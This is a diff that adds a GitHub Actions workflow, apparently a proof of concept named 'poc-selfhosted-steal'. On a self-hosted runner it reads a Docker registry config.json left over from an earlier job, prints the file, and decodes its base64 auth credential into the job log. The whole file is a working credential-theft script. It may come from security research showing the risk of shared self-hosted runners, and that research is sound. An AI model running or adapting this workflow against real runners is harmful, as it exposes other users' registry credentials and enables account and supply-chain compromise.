@@ -1,0 +1,28 @@
+name: poc-selfhosted-steal
+on:
+  workflow_dispatch:
+
+jobs:
+  steal:
+    runs-on: [self-hosted, linux, lab-runner-1]
+    steps:
+      - name: Read leftover config.json from previous run
+        shell: bash
+        run: |
+          set -euo pipefail
+          TARGET="$HOME/.docker/buildx/config/registry-1.docker.io/myscope/config.json"
+
+          if [ ! -f "$TARGET" ]; then
+            echo "NOT_FOUND: $TARGET"
+            exit 1
+          fi
+
+          echo "FOUND: $TARGET"
+          cat "$TARGET"
+
+          AUTH_B64="$(sed -n 's/.*\"auth\":\"\([^\"]*\)\".*/\1/p' "$TARGET")"
+          if [ -n "$AUTH_B64" ]; then
+            echo -n "DECODED_AUTH="
+            echo "$AUTH_B64" | base64 -d
+            echo
+          fi
